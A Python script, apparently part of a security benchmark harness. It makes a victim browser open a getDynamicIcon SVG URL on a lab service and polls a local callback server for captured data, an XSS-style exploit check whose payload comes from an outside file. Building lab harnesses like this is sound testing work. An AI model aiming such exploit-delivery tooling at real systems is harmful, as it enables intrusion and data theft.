#!/usr/bin/env python3
"""Ask the victim browser to open a getDynamicIcon SVG document, then read callback /dump."""
import json
import os
import re
import sys
import time
import urllib.parse
import urllib.request


def _env_int(name, default):
    v = os.environ.get(name) or ""
    try:
        return int(v)
    except ValueError:
        return default


CALLBACK = _env_int("PCB_CALLBACK_PORT", 0)
VICTIM = _env_int("PCB_VICTIM_PORT", 0)
_SVC_BASE = {"v0": "http://v0:6806", "v1": "http://v1:6806", "v2": "http://v2:6806"}


def _rewrite_base(cand: dict, version: str) -> tuple:
    base = _SVC_BASE.get(version, "http://v1:6806")
    target = cand.get("target", "")
    origin = cand.get("origin", base)
    target = re.sub(r"^https?://[^/]+", base, target)
    origin = re.sub(r"^https?://[^/]+", base, origin)
    return target, origin


def run_probe(candidate, *, version="v1"):
    if not CALLBACK or not VICTIM:
        raise SystemExit("PCB_CALLBACK_PORT / PCB_VICTIM_PORT unset")
    target, origin = _rewrite_base(candidate, version)
    urllib.request.urlopen(f"http://127.0.0.1:{CALLBACK}/reset", timeout=10).read()
    visit_url = (
        f"http://127.0.0.1:{VICTIM}/visit?target="
        + urllib.parse.quote(target, safe="")
        + "&origin="
        + urllib.parse.quote(origin, safe="")
    )
    try:
        urllib.request.urlopen(visit_url, timeout=120).read()
    except Exception:
        pass
    hits = []
    for _ in range(8):
        time.sleep(2)
        try:
            with urllib.request.urlopen(f"http://127.0.0.1:{CALLBACK}/dump", timeout=10) as r:
                hits = json.loads(r.read().decode())
            if hits:
                break
        except Exception:
            pass
    return {"status": 200, "body": "\n".join(hits) if isinstance(hits, list) else str(hits)}


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
